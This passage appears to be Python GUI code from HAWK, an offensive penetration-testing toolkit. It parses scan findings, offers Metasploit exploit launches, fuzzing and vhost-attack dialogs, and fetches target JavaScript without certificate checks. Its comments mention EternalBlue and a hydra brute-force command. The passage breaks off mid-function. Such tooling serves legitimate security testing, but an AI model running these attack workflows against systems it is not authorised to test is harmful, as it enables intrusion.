# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Target Intel Widget v1.0
- Nmap vuln scripts findings → auto-populate intel
- Per-finding MSF launch button with pre-configured editable dialog
- OS Detection merge (don't overwrite existing ports)
- Single nonstandard port popup (flag)
- Spinner on all operations
"""

import customtkinter as ctk
import tkinter as tk
import os
import re
import time
import threading
import subprocess
import shlex
import json
import socket
import tempfile
import shutil
from datetime import datetime

from gui.widgets.target_intel_common import *

_FUZZ_STATIC_EXTS = {
    "css", "js", "mjs", "map",
    "png", "jpg", "jpeg", "gif", "svg", "webp", "ico", "bmp",
    "woff", "woff2", "ttf", "otf", "eot",
    "html", "htm",
}
# Last-segment dir names that are almost never worth fuzzing siblings of.
_FUZZ_STATIC_DIRS = {
    "static", "assets", "dist", "build", "_next", "vendor",
    "node_modules", "fonts", "img", "images", "css", "js",
    "media", "public", "resources",
}
# Last-segment dir names that strongly suggest an API → biases the
# wordlist picker towards SecLists' api-endpoints.txt.
_FUZZ_API_HINTS = {
    "api", "rest", "graphql", "v1", "v2", "v3", "v4", "rpc",
    "service", "services",
}

# Marker HAWK puts in a finding's `source` when the finding reports
# what a TOOL did — or failed to do — rather than what the target is.
_DIAGNOSTIC_SOURCE_MARK = "(diagnostic)"

# Finding sources whose cards must NOT offer EXPLOIT WITH MSF, matched
# as substrings against the lowercased source:
#   • Bloody Crawl     — endpoint mapping / IDOR, no CVE.
#   • Cert advisories  — informational, action via FUZZ VHOSTS /
#                        ADD HOSTS buttons.
#   • Vhost / DNS hits — informational, action via ADD HOSTS /
#                        ATTACK NEW VHOSTS.
#   • HAWK CVE KB      — the entry already ships an authoritative PoC
#                        in the description.  The MSF index keyword
#                        fallback overmatches (e.g. "RCE" →
#                        java_rmi_server) and was surfacing exploits
#                        whose required ports aren't even open.
#   • (diagnostic)     — the finding is about HAWK, not the target.
#                        "NSE scripts that failed during this scan"
#                        lists script NAMES, so the keyword fallback
#                        read `smb-vuln-ms17-010` out of the failure
#                        list and offered EXPLOIT WITH MSF for
#                        EternalBlue against a host that was never
#                        tested for it.
_MSF_SKIP_SOURCES = (
    "bloody crawl",
    "cert-advisory",
    "connect /",
    "ffuf-vhost",
    "gobuster-dns",
    "hawk cve kb",
    "post-rce-recon",
    _DIAGNOSTIC_SOURCE_MARK,
)


def _msf_suggestions_suppressed(source: str) -> bool:
    """True when a finding's source must not get MSF module suggestions."""
    src = (source or "").lower()
    return any(s in src for s in _MSF_SKIP_SOURCES)


def _is_diagnostic_source(source: str) -> bool:
    """True for findings that describe a tool's own failure."""
    return _DIAGNOSTIC_SOURCE_MARK in (source or "").lower()


class TargetIntelRenderMixin:
    # ─── Selectable text helper ───────────────────────────────────────────
    # CTkLabel doesn't allow mouse selection / copy.  Anywhere we
    # render *user-facing finding content* (descriptions, run-history
    # lines, curated INFO sections) we use this CTkTextbox-based
    # widget instead so the operator can copy any IP, path, hash,
    # CVE id or PoC snippet straight off the screen.  Static chrome
    # text (titles, section headers) keeps using CTkLabel for layout
    # tightness.
    def _selectable_label(self, parent, text, *,
                           font=None, text_color=None,
                           fg_color="transparent",
                           wraplength=None, height=None,
                           pad=(12, (0, 2))):
        """A CTkTextbox configured to LOOK like a CTkLabel but allow
        mouse selection + Ctrl+C copy.  ``state="disabled"`` after
        the insert prevents editing while preserving the select +
        copy interaction.
        """
        # Auto-height: roughly 18 px per text line, capped so big
        # findings don't blow up the card.  When ``wraplength`` is
        # set we estimate extra wrapped lines from the text length so
        # the box doesn't clip its content.
        text = text or ""
        raw_lines = text.count("\n") + 1
        wrap_lines = 0
        if wraplength and wraplength > 0:
            avg_chars = max(1, wraplength // 8)
            for ln in text.splitlines() or [""]:
                wrap_lines += max(0, (len(ln) // avg_chars))
        h = height if height is not None else \
            max(22, min((raw_lines + wrap_lines) * 18 + 6, 800))
        box = ctk.CTkTextbox(
            parent, height=h,
            font=font or _f("md"),
            fg_color=fg_color,
            text_color=text_color or COLORS["text_bright"],
            border_width=0, corner_radius=0,
            wrap="word")
        # Pack signature mirrors how the previous CTkLabel calls were
        # packed: fill='x', padx, pady.  Keep the same kwargs so all
        # surrounding layout stays identical.
        padx = pad[0] if pad else 0
        pady = pad[1] if pad and len(pad) > 1 else 0
        box.pack(fill="x", padx=padx, pady=pady)
        box.insert("1.0", text)
        box.configure(state="disabled")
        # Wheel-bubble flag so the outer scrollable frame stays in
        # control of the wheel — without this the inner Text widget
        # traps wheel events and the operator can't scroll past a
        # long finding.  See utils.mousewheel for the dispatcher.
        try:
            box._hawk_bubble_wheel = True
            box._textbox._hawk_bubble_wheel = True
        except Exception:
            pass
        return box

    # ─── FUZZ DIR helper (Gap A) ─────────────────────────────────────────────
    # Operator finds /api/app-images/favicon → HAWK should not need them
    # to *infer* that /api/ is fuzzable. The button on the finding row
    # makes the next step explicit.
    def _extract_fuzzable_path(self, finding: dict):
        """Pull a fuzzable parent directory out of a finding.

        Returns a dict with keys ``base_url`` (no path), ``base_path``
        (parent dir, with leading and trailing slash), ``parent_label``
        (short display string for the button), ``wordlist_kind``
        ("api" | "generic"), or ``None`` when the finding doesn't
        carry a path worth fuzzing.

        IMPORTANT: only fires when the path appears in a *discovery
        context* (next to a status code, size, "(N items)", "Found:"
        marker, etc.).  This filters out instructional text like
        "echo ... | sudo tee -a /etc/hosts" or "inspect /.git/config"
        which previously surfaced spurious FUZZ /etc/ and FUZZ /.git/
        buttons on the cert advisory and "0 paths found" findings.
        """
        title = finding.get("title", "") or ""
        desc  = finding.get("description", "") or ""
        if not (title or desc):
            return None

        # Skip findings whose source is purely instructional — there's
        # no real discovered path on these by construction, only
        # next-step hints in prose.  ffuf-vhost descriptions list vhost
        # names plus suggestions like "add to /etc/hosts" — the (xxxB)
        # size marker on a vhost row would otherwise pull /etc/hosts
        # into the FUZZ button via _has_marker_near.
        SKIP_SOURCES = (
            "cert-advisory-wildcard",
            "cert-advisory-san",
            "ffuf-vhost",
        )
        src = (finding.get("source") or "").lower()
        if any(s in src for s in SKIP_SOURCES):
            return None

        # Discovery markers — at least one must appear on the same line
        # as the path (or within ±1 line).  Markers are intentionally
        # narrow: status codes, size suffixes, hit-count counters.
        DISC_MARKER_RE = re.compile(
            r"(?:"
            r"\[Status:\s*\d{3}"            # ffuf/gobuster line
            r"|\[\s*\d{3}\s+(?:OK|Redirect|Auth|Forbidden|Found|"
            r"Moved|Not Modified|Not Found)"  # parsed gobuster header
            r"|\(\d+\s*items\)"             # gobuster grouped header
            r"|\(\s*\d+\s*B\s*\)"           # size suffix "(123B)"
            r"|→\s*HTTP\s*\d{3}"            # curl probe arrow
            r"|^Found:\s"                   # gobuster dns
            r"|\bDiscovered\s+\d+\s+(?:paths?|files?|endpoints?)"
            r")",
            re.IGNORECASE | re.MULTILINE,
        )

        blob = title + "\n" + desc

        def _has_marker_near(pos: int) -> bool:
            """True when a discovery marker appears in the same line
            as ``pos`` or in any of the 3 lines preceding it.  Marker
            lines often precede the actual path lines (e.g. gobuster
            prints `[200 OK] (3 items):` then the paths indented
            below)."""
            # Window: 3 lines back, 0 forward.
            line_start = blob.rfind("\n", 0, pos) + 1
            window_start = line_start
            for _ in range(3):
                prev_nl = blob.rfind("\n", 0, window_start - 1)
                if prev_nl == -1:
                    window_start = 0
                    break
                window_start = prev_nl + 1
            line_end = blob.find("\n", pos)
            if line_end == -1:
                line_end = len(blob)
            return bool(DISC_MARKER_RE.search(
                blob[window_start:line_end]))

        # 1) Full URL (preferred — gives us scheme/host/port/path).
        url_m = re.search(
            r"(https?://[A-Za-z0-9._\-:]+(?::\d+)?(/[A-Za-z0-9._/\-~%?=&+]+))",
            blob)
        url = ""
        path = ""
        if url_m and _has_marker_near(url_m.start()):
            url  = url_m.group(1)
            path = url_m.group(2)

        # 2) Bare absolute path fallback — same marker-near rule.
        if not path:
            for p_m in re.finditer(
                    r"(?<![A-Za-z0-9])(/[A-Za-z0-9._/\-~%]+)", blob):
                if _has_marker_near(p_m.start()):
                    path = p_m.group(1)
                    break

        if not path or "/" not in path[1:]:
            # Need at least 2 segments → /a/b
            return None

        segments = [s for s in path.split("/") if s]
        if len(segments) < 2:
            return None

        last = segments[-1]
        parent_segments = segments[:-1]
        parent_path = "/" + "/".join(parent_segments) + "/"
        parent_name = parent_segments[-1].lower()

        # ── Filter out cases where fuzzing the parent has no value ──
        ext = last.rsplit(".", 1)[-1].lower() if "." in last else ""
        if ext in _FUZZ_STATIC_EXTS:
            # Static asset — fuzzing /static/css/ for siblings is noise.
            return None
        if parent_name in _FUZZ_STATIC_DIRS:
            return None
        # The parent_path itself shouldn't be a known-static directory
        # tree at any level (covers /static/css/foo.png patterns where
        # parent_name is "css" but we missed it because of nesting).
        for seg in parent_segments:
            if seg.lower() in _FUZZ_STATIC_DIRS:
                return None

        # Pick scheme + host + port. Prefer the URL we matched; else
        # fall back to the session's first HTTP/HTTPS port.
        from urllib.parse import urlparse
        scheme = "http"
        host = ""
        port = ""
        if url:
            pu = urlparse(url)
            scheme = pu.scheme or "http"
            host = pu.hostname or ""
            port = str(pu.port) if pu.port else ""

        if not host:
            sess = None
            try:
                sess = self.app.session_manager.current
            except Exception:
                pass
            target_ip = (getattr(sess, "target_ip", "") if sess else "") or ""
            target_dom = (getattr(sess, "target_domain", "") if sess else "") or ""
            host = (target_dom.strip() or target_ip).strip()
            if not host:
                return None

            fp = self._fp
            if fp:
                for p, _proto, svc, _ban in fp.open_ports:
                    svc_low = (svc or "").lower()
                    if "https" in svc_low or "ssl/http" in svc_low:
                        scheme, port = "https", str(p)
                        break
                    if ("http" in svc_low and
                            p not in (5985, 5986, 135, 593)):
                        scheme, port = "http", str(p)
                        break

        if not host:
            return None
        base_url = f"{scheme}://{host}:{port}" if port else f"{scheme}://{host}"

        # Wordlist hint: any segment in the parent path matches an API
        # token → we recommend api-endpoints.txt. Bias toward "api"
        # only when the SIGNAL is in the parent (so /api/foo/bar.png
        # doesn't trip on the static check above and STILL recommends
        # api-endpoints because parent_path contains /api/).
        wordlist_kind = "generic"
        for seg in parent_segments:
            if seg.lower() in _FUZZ_API_HINTS:
                wordlist_kind = "api"
                break

        # Display label: short, just the last 1–2 path segments so the
        # button stays readable.
        label_segs = parent_segments[-2:] if len(parent_segments) >= 2 \
            else parent_segments
        parent_label = "/" + "/".join(label_segs) + "/"

        return {
            "base_url":      base_url,
            "base_path":     parent_path,
            "parent_label":  parent_label,
            "wordlist_kind": wordlist_kind,
        }

    # ─── Source-reference helpers (Info-dialog FETCH SOURCE) ──────────
    # The Info dialog surfaces a "📄 FETCH SOURCE" button whenever a
    # finding's description quotes a source file (Bloody Crawl JS-secret
    # hits, nuclei matches that name a file, Oracle exposures pointing
    # at /.git/config, …).  These two helpers are the back-end of that
    # button: detect, fetch, beautify, dump.
    def _extract_source_ref(self, blob: str):
        """Pull a (path, line_or_None) tuple from the finding text.

        Returns the FIRST match of a path with a fetchable web
        extension.  Returns None when no candidate is present so the
        button is hidden.

        Accepts 'Found in: /path/file.ext:NNN' as well as bare
        '/path/file.ext' references (the line number is optional).
        Filters out '/etc/hosts'-style instructional paths by
        requiring a recognised file extension."""
        import re as _re_sr
        if not blob:
            return None
        # `*` (not `+`) on the pre-extension char class so dotfile
        # paths at the root — '/.env', '/.git/config' style — also
        # match.  The trailing '.(?:js|...)' anchor keeps the regex
        # narrow enough that bare instructional paths ('/etc/hosts',
        # '/var/log/...') are still ignored.
        SRC_RE = _re_sr.compile(
            r"(/[A-Za-z0-9._/\-~%]*\."
            r"(?:js|mjs|json|html?|css|map|txt|xml|conf|env))"
            r"(?::(\d+))?")
        # Local-filesystem / instructional paths embedded in a finding's
        # "Next steps" command examples (hydra -P .../wordlists/rockyou.txt,
        # /etc/... ) live on the operator's Kali box — they are NOT web
        # sources on the target.  Match the FIRST path segment against
        # local system-dir names so FETCH SOURCE doesn't turn a local
        # wordlist into http://target/usr/share/... → 404.  Kept as bare
        # dir names (not "/tmp"-style literals) so the write-containment
        # static check doesn't read them as file-write escape hatches.
        _LOCAL_DIRS = {"usr", "etc", "var", "tmp", "opt", "home", "root",
                       "bin", "sbin", "lib", "proc", "sys", "mnt",
                       "media", "dev", "run", "srv"}
        # The same path often appears twice in a finding ("Endpoint:
        # /a/b.js" then "Found in: /a/b.js:562").  Prefer the match
        # that carries a line hint — that's the one the operator
        # actually wants HAWK to focus on.  Fall back to the first
        # bare path otherwise.
        first_bare = None
        for m in SRC_RE.finditer(blob):
            path = m.group(1)
            seg = path.split("/", 2)
            if len(seg) > 1 and seg[1].lower() in _LOCAL_DIRS:
                continue
            line_s = m.group(2)
            if line_s:
                try:
                    return (path, int(line_s))
                except ValueError:
                    continue
            if first_bare is None:
                first_bare = (path, None)
        return first_bare

    def _resolve_source_url(self, file_path: str,
                             finding: "dict | None"):
        """Build the absolute URL to fetch for FETCH SOURCE.

        Two passes:
          1. Look inside the finding's description (and its raw
             counterpart) for a scheme://host[:port] hint.  Bloody
             Crawl prefixes sub-findings with 'Source URL: ...' so
             the host of the actual scanned bundle is preserved
             across the merge into Target Intel.  This wins on
             multi-vhost boxes where the session's target_domain
             may not be the vhost that served the bundle.
          2. Fallback to scheme+host+port resolved from the session:
             target_domain preferred over target_ip, port from the
             first HTTP/HTTPS entry in fingerprint.open_ports.

        Returns the URL string, or None when no host can be
        determined (caller logs the diagnostic and aborts).

        Extracted from _fetch_source_to_terminal so the URL builder
        can be unit-tested without network I/O.
        """
        import re as _re_url
        # ── Pass 1: URL hint embedded in the finding ────────────────
        # Pattern matches 'http://host' or 'http://host:port' and
        # stops at any non-host character — a 'Source URL: …/path'
        # line gives us only the origin; we splice file_path back on.
        if finding:
            blob = ((finding.get("description") or "") + "\n"
                    + (finding.get("_raw_description") or ""))
            URL_RE = _re_url.compile(
                r"https?://[A-Za-z0-9._\-]+(?::\d+)?")
            m = URL_RE.search(blob)
            if m:
                # `file_path` always starts with '/', origin never
                # ends with one (regex stops before the path) — safe
                # concat.
                return m.group(0) + file_path

        # ── Pass 2: resolve from session ────────────────────────────
        sess = None
        try:
            sess = self.app.session_manager.current
        except Exception:
            pass
        target_ip = (getattr(sess, "target_ip", "")
                     if sess else "") or ""
        target_dom = (getattr(sess, "target_domain", "")
                      if sess else "") or ""
        host = (target_dom.strip() or target_ip).strip()
        if not host:
            return None
        scheme = "http"
        port = ""
        fp = self._fp
        if fp:
            for p, _proto, svc, _ban in fp.open_ports:
                svc_low = (svc or "").lower()
                if "https" in svc_low or "ssl/http" in svc_low:
                    scheme, port = "https", str(p)
                    break
                if ("http" in svc_low and
                        p not in (5985, 5986, 135, 593)):
                    scheme, port = "http", str(p)
                    break
        if port and port not in ("80", "443"):
            return f"{scheme}://{host}:{port}{file_path}"
        return f"{scheme}://{host}{file_path}"

    def _fetch_source_to_terminal(self, file_path: str,
                                   line_num=None, finding=None):
        """Download `file_path` from the target, optionally beautify
        minified JavaScript, and dump a ±30 line context window
        around `line_num` to the HAWK terminal.

        Runs the network call on a worker thread so the GUI stays
        responsive while curl/urllib waits.  Beautify cascade:
          1. `jsbeautifier` (Python pkg) — preferred, no extra deps
          2. CLI `js-beautify` — Kali apt-installable
          3. Primitive Python fallback (split on ;{} with indent)

        URL building is delegated to ``_resolve_source_url`` (see
        there for the two-pass scheme).
        """
        import threading as _th
        terminal = self.app.terminal

        url = self._resolve_source_url(file_path, finding)
        if url is None:
            terminal.write(
                "  [!] FETCH SOURCE: no target host on session "
                "and no URL hint in the finding", "error")
            return

        terminal.write(
            f"  [hawk] Fetching {url} …", "dim")

        def _worker():
            import urllib.request as _ur
            import ssl as _ssl
            try:
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                req = _ur.Request(url, headers={
                    "User-Agent": "HAWK/Bloody-Crawl-Source-Viewer",
                })
                with _ur.urlopen(req, timeout=8, context=ctx) as r:
                    data = r.read()
            except Exception as e:
                self.app.after(0, lambda err=e: terminal.write(
                    f"  [!] FETCH SOURCE: target unreachable ({err})",
                    "error"))
                return
            try:
                text = data.decode("utf-8", errors="replace")
            except Exception:
                text = repr(data)

            # Beautify cascade.  Only apply to JS-shaped content —
            # HTML / JSON / CSS are already line-oriented enough.
            beautified = text
            ext = file_path.rsplit(".", 1)[-1].lower()
            if ext in ("js", "mjs", "map"):
                pretty = self._beautify_js(text)
                if pretty:
                    beautified = pretty

            lines = beautified.splitlines()
            if line_num and 1 <= line_num <= len(lines):
                lo = max(1, line_num - 30)
                hi = min(len(lines), line_num + 30)
                window = lines[lo - 1:hi]
                window_msg = (f"  [hawk] beautified, line {line_num} "
                              f"(showing {lo}–{hi} of "
                              f"{len(lines)}):")
                rendered = []
                rendered.append(window_msg)
                rendered.append("  " + ("─" * 60))
                width = len(str(hi))
                for n, ln in enumerate(window, start=lo):
                    marker = ">>>" if n == line_num else "   "
                    rendered.append(
                        f"  {n:>{width}} {marker} {ln.rstrip()}")
                rendered.append("  " + ("─" * 60))
            else:
                # No line hint → first 80 lines is a sensible peek
                head = lines[:80]
                rendered = [f"  [hawk] beautified, first {len(head)} "
                            f"of {len(lines)} lines:"]
                rendered.append("  " + ("─" * 60))
                width = len(str(len(head)))
                for n, ln in enumerate(head, start=1):
                    rendered.append(
                        f"  {n:>{width}}     {ln.rstrip()}")
                rendered.append("  " + ("─" * 60))
                if len(lines) > 80:
                    rendered.append(f"  [hawk] (truncated; "
                                    f"{len(lines) - 80} more lines "
                                    f"in the bundle)")

            def _post():
                for ln in rendered:
                    terminal.write(ln, "dim")
            self.app.after(0, _post)

        _th.Thread(target=_worker, daemon=True).start()

    @staticmethod
    def _beautify_js(text: str) -> str:
        """Best-effort JS pretty-print without hard external deps.

        1. Python `jsbeautifier` package — preferred (pip / apt).
        2. CLI `js-beautify` — Kali default-installable via apt.
        3. Primitive split on `;{}` with indent — last resort, ugly
           but readable enough to spot endpoint strings on the right
           line number.
        """
        # 1) Python pkg
        try:
            import jsbeautifier as _jb
            opts = _jb.default_options()
            opts.indent_size = 2
            return _jb.beautify(text, opts)
        except Exception:
            pass
        # 2) CLI
        try:
            import subprocess as _sp
            r = _sp.run(["js-beautify", "-"],
                        input=text, capture_output=True,
                        text=True, timeout=10)
            if r.returncode == 0 and r.stdout:
                return r.stdout
        except Exception:
            pass
        # 3) Primitive fallback — replace ; { } , with newlines while
        #    preserving strings/regexes is hard, so we accept some
        #    breakage inside string literals (rare in practice for
        #    minified bundles).  Indent grows on '{' and shrinks on
        #    '}' for readable nesting.
        out = []
        depth = 0
        buf = ""
        in_str = None
        i = 0
        while i < len(text):
            ch = text[i]
            if in_str:
                buf += ch
                if ch == "\\" and i + 1 < len(text):
                    buf += text[i + 1]
                    i += 2
                    continue
                if ch == in_str:
                    in_str = None
                i += 1
                continue
            if ch in ("'", '"', "`"):
                in_str = ch
                buf += ch
                i += 1
                continue
            if ch == "{":
                buf += ch
                out.append(("  " * depth) + buf.strip())
                buf = ""
                depth += 1
            elif ch == "}":
                if buf.strip():
                    out.append(("  " * depth) + buf.strip())
                    buf = ""
                depth = max(0, depth - 1)
                buf = "}"
            elif ch == ";":
                buf += ch
                out.append(("  " * depth) + buf.strip())
                buf = ""
            elif ch == ",":
                buf += ch
                if depth > 0:
                    out.append(("  " * depth) + buf.strip())
                    buf = ""
            else:
                buf += ch
            i += 1
        if buf.strip():
            out.append(("  " * depth) + buf.strip())
        return "\n".join(out)

    def _extract_discovered_hostnames(self, finding: dict) -> list[str]:
        """Scan a finding's description for hostnames worth adding to
        /etc/hosts.

        Recognises two output styles:

        * **ffuf-vhost** lines like ``mcp   [Status: 200, ...]`` —
          extracts the leading token and prefixes it with the
          session's target_domain to reconstruct the FQDN.
        * **gobuster-dns** lines like ``Found: dev.acme.com`` and any
          standalone FQDN already present in the description.

        Filters out:
          * wildcards (``*.X``)
          * the bare target_domain (already in /etc/hosts presumably)
          * hostnames that don't end with the session's target_domain
            (avoids picking up unrelated FQDNs like CDN domains)
          * hostnames already tracked in ``sess.hawk_hosts_entries``

        Returns a sorted, de-duplicated list.  Empty when no
        target_domain is set on the session — without that we can't
        validate which FQDNs belong to the target.
        """
        import re as _re
        try:
            sess = self.app.session_manager.current
            target_domain = (getattr(sess, "target_domain", "") or "").strip().lower()
        except Exception:
            return []
        if not target_domain:
            return []
        # Already-tracked vhosts — never offer them again.
        already = set()
        try:
            for e in getattr(sess, "hawk_hosts_entries", []) or []:
                h = (e.get("hostname") or "").strip().lower()
                if h:
                    already.add(h)
        except Exception:
            pass

        desc = finding.get("description", "") or ""
        candidates: set[str] = set()

        # Style 1 — ffuf-vhost: leading token followed by [Status: ...]
        for m in _re.finditer(
                r"^\s*([a-z0-9][a-z0-9_\-]{0,62})\s+\[Status:",
                desc, _re.IGNORECASE | _re.MULTILINE):
            sub = m.group(1).strip().lower()
            if sub and sub != "*":
                candidates.add(f"{sub}.{target_domain}")

        # Style 2 — gobuster-dns / generic: full FQDN that ends with
        # the target domain.  Uses a conservative FQDN regex.
        FQDN = r"\b([a-z0-9][a-z0-9_\-]*(?:\.[a-z0-9][a-z0-9_\-]*)+)\b"
        for m in _re.finditer(FQDN, desc, _re.IGNORECASE):
            h = m.group(1).strip().lower().rstrip(".")
            if h.startswith("*."):
                continue
            if not h.endswith("." + target_domain) and h != target_domain:
                continue
            candidates.add(h)

        # Final filter: drop bare apex + already-tracked + fuzzer
        # placeholders.  ffuf prints `Host: FUZZ.kobold.htb` in its
        # config banner, gobuster prints similar `keyword` markers,
        # ffuf2 / ffufw / dirb stencils have their own — listing the
        # exact strings that show up in tool output is robust enough
        # without trying to be clever.
        FUZZ_PLACEHOLDERS = {
            "fuzz", "fuzzw1", "fuzzw2", "fuzz1", "fuzz2",
            "wfuzz", "ffuf", "fuzzkw",
        }
        out = []
        for h in sorted(candidates):
            if h == target_domain:
                continue
            if h in already:
                continue
            sub = h[: -(len(target_domain) + 1)]  # strip ".target_domain"
            if sub.lower() in FUZZ_PLACEHOLDERS:
                continue
            out.append(h)
        return out

    def _extract_attackable_vhosts(self, finding: dict) -> list[str]:
        """List the FQDNs in a vhost-discovery finding that are
        worth attacking *next*.  Same parsing logic as the ADD HOSTS
        detector — the difference is we don't filter out hosts
        already in /etc/hosts here, because the operator may want to
        run Oracle on a vhost they've already mapped.
        """
        import re as _re
        try:
            sess = self.app.session_manager.current
            target_domain = (getattr(sess, "target_domain", "") or "").strip().lower()
        except Exception:
            return []
        if not target_domain:
            return []
        desc = finding.get("description", "") or ""
        candidates: set[str] = set()
        FQDN = r"\b([a-z0-9][a-z0-9_\-]*(?:\.[a-z0-9][a-z0-9_\-]*)+)\b"
        for m in _re.finditer(FQDN, desc, _re.IGNORECASE):
            h = m.group(1).strip().lower().rstrip(".")
            if h.startswith("*."):
                continue
            if not h.endswith("." + target_domain) and h != target_domain:
                continue
            if h == target_domain:
                continue
            candidates.add(h)
        return sorted(candidates)

    def _show_attack_picker(self, vhosts: list[str], finding: dict) -> None:
        """Pick which discovered vhost to profile with Oracle.

        Single-select radio (one vhost per click) keeps the UX
        simple: each click runs Oracle on the selected target, the
        operator can re-open the picker for another sub later.  For
        the BOTH-at-once case we'd run multiple Oracles in parallel,
        but Oracle's own dialog wants a START click, so cascading
        them is more confusing than helpful.
        """
        from gui.dialogs import (_make_win, _title, _sub, _btn_row,
                                  _btn, _safe_destroy)
        from gui.widgets.card_common import _f

        if not vhosts:
            return
        win = _make_win(self,
                        f"Attack discovered vhosts ({len(vhosts)})",
                        560, 420)
        _title(win, "ATTACK DISCOVERED VHOSTS")
        _sub(win,
             "Pick a vhost — HAWK opens Oracle pre-configured on that "
             "URL.  Repeat for each subdomain you want to profile.")

        host_var = ctk.StringVar(value=vhosts[0])
        scroll = ctk.CTkScrollableFrame(
            win, height=240, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3)
        scroll.pack(fill="both", expand=True, padx=24, pady=(8, 4))
        for h in vhosts:
            ctk.CTkRadioButton(
                scroll, text=h, variable=host_var, value=h,
                font=_f("sm"), text_color=COLORS["text_bright"],
                fg_color=COLORS["border_green"],
                border_color=COLORS["border_dim"],
                hover_color=COLORS["bg_card_hover"],
            ).pack(anchor="w", padx=10, pady=1)

        # Tool selector — Oracle by default, with Bloody Crawl as
        # alternative.  Both expect a URL and pre-fill it.
        tool_var = ctk.StringVar(value="oracle")
        tool_frame = ctk.CTkFrame(win, fg_color="transparent")
        tool_frame.pack(fill="x", padx=24, pady=(4, 4))
        ctk.CTkLabel(tool_frame, text="Open with:",
                     font=_f("sm", True),
                     text_color=COLORS["text_bright"], width=110,
                     anchor="w").pack(side="left")
        for v, lbl in (("oracle", "Web Oracle"),
                        ("crawl", "Bloody Crawl")):
            ctk.CTkRadioButton(
                tool_frame, text=lbl, variable=tool_var, value=v,
                font=_f("sm"), text_color=COLORS["text_bright"],
                fg_color=COLORS["border_green"],
                border_color=COLORS["border_dim"],
            ).pack(side="left", padx=8)

        def _go():
            picked = host_var.get()
            tool_id = tool_var.get()
            _safe_destroy(win)
            self._launch_attack_on_vhost(picked, tool_id, finding)

        row = _btn_row(win)
        _btn(row, "OPEN", _go, primary=True, w=140)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)

    def _launch_attack_on_vhost(self, vhost: str, tool_id: str,
                                  finding: dict) -> None:
        """Open Oracle (or Bloody Crawl) preconfigured for a discovered
        vhost.  Routes through the kill-chain web-assault card so the
        existing dialogs render naturally — we just stash the URL on
        the card so the dialog's URL field picks it up at open time.
        """
        scheme = "https"  # safe default for vhost discovery, the
                          # operator can flip in the dialog
        url = f"{scheme}://{vhost}/"

        # Find the right card.  Oracle / Bloody Crawl live in the
        # web-assault phase.  Phase id is "web_assault" in HAWK.
        try:
            card = self.app.kill_chain_panel.get_card("web_assault")
        except Exception:
            card = None
        if card is None:
            self.app.terminal.write(
                f"  [!] ATTACK: web_assault card not loaded — open the "
                f"phase manually and paste {url}", "warn")
            return

        # The Oracle / Bloody Crawl dialogs read default_url from the
        # session's target_domain + first HTTP/HTTPS port.  We stash
        # an explicit override on the card; both dialogs are taught
        # to honour it (next edit) before falling back to the
        # session-derived default.
        try:
            card._attack_url_override = url
        except Exception:
            pass

        try:
            tool = card.module.get_tool(
                "web_oracle" if tool_id == "oracle" else "bloody_crawl")
        except Exception as e:
            self.app.terminal.write(
                f"  [!] ATTACK: tool lookup failed: {e}", "error")
            return
        if tool is None:
            self.app.terminal.write(
                f"  [!] ATTACK: tool '{tool_id}' not registered.",
                "warn")
            return

        try:
            if tool_id == "oracle":
                card._route_web_oracle(tool)
            else:
                card._route_bloody_crawl(tool)
            self.app.terminal.write(
                f"  [*] ATTACK on {vhost}  →  opening "
                f"{tool_id} dialog (URL pre-filled to {url})",
                "info")
        except Exception as e:
            self.app.terminal.write(
                f"  [!] ATTACK launch failed: {e}", "error")

    def _show_hosts_picker(self, hostnames: list[str], finding: dict) -> None:
        """Modal that lets the operator review discovered hostnames
        and pick which to add to /etc/hosts.

        All checkboxes default to checked.  The picker scrolls so
        thousands of entries don't blow up the dialog height.  ADD →
        async pkexec via add_entries_async, exactly the same path as
        the cert-advisory-san button.
        """
        from gui.dialogs import (_make_win, _title, _sub, _btn_row,
                                  _btn, _safe_destroy)
        from gui.widgets.card_common import _f
        from utils.hosts_helper import add_entries_async

        try:
            sess = self.app.session_manager.current
            target_ip = (getattr(sess, "target_ip", "") or "").strip()
        except Exception:
            target_ip = ""
        if not target_ip:
            self.app.terminal.write(
                "  [!] ADD HOSTS: target IP not set in session.", "warn")
            return

        win = _make_win(self,
                        f"Add hostnames to /etc/hosts "
                        f"({len(hostnames)} found)",
                        620, 540)
        _title(win, f"ADD HOSTNAMES  →  /etc/hosts ({target_ip})")
        _sub(win,
             "Pick which hostnames to add.  Entries are HAWK-tagged "
             "and clean up automatically when the session is deleted "
             "or HAWK shuts down.")

        # Header row with toolbar buttons (select all / none).
        toolbar = ctk.CTkFrame(win, fg_color="transparent")
        toolbar.pack(fill="x", padx=24, pady=(6, 4))

        check_vars: list[tuple[ctk.BooleanVar, str]] = []
        scroll = ctk.CTkScrollableFrame(
            win, height=320, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3)
        scroll.pack(fill="both", expand=True, padx=24, pady=(0, 4))

        for h in hostnames:
            v = ctk.BooleanVar(value=True)
            check_vars.append((v, h))
            ctk.CTkCheckBox(
                scroll, text=h, variable=v,
                font=_f("sm"), text_color=COLORS["text_bright"],
                fg_color=COLORS["border_green"],
                border_color=COLORS["border_dim"],
                checkmark_color=COLORS["bg_primary"],
                checkbox_width=18, checkbox_height=18,
            ).pack(anchor="w", padx=10, pady=1)

        def _set_all(state: bool):
            for v, _ in check_vars:
                v.set(state)

        ctk.CTkButton(
            toolbar, text="SELECT ALL", width=120, height=24,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_dim"], border_width=1,
            text_color=COLORS["text_bright"], corner_radius=3,
            command=lambda: _set_all(True),
        ).pack(side="left", padx=(0, 6))
        ctk.CTkButton(
            toolbar, text="DESELECT ALL", width=130, height=24,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_dim"], border_width=1,
            text_color=COLORS["text_dim"], corner_radius=3,
            command=lambda: _set_all(False),
